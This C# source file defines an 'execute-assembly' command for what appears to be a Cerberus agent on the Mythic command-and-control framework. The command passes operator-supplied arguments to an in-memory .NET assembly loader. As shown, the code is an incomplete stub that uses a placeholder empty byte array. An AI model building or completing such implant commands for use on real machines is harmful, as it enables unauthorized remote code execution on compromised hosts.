using Models.Tasks;

namespace Tasks.Commands
{
    public class ExecuteAssembly : CerberusCommand
    {
        public override string Name => "execute-assembly";

        public override MythicTaskResult Execute(MythicTask task)
        {
            var Arguments = task.parameters.Split(' ');
            var FileBytes = new byte[10];
            //return Internal.Execute.ExecuteAssembly(FileBytes, Arguments);
            var result = new MythicTaskResult
            {
                task_id = task.id,
                user_output = Internal.Execute.ExecuteAssembly(FileBytes, Arguments),
                completed = true,
                status = "success"
            };

            return result;
        }
    }
}
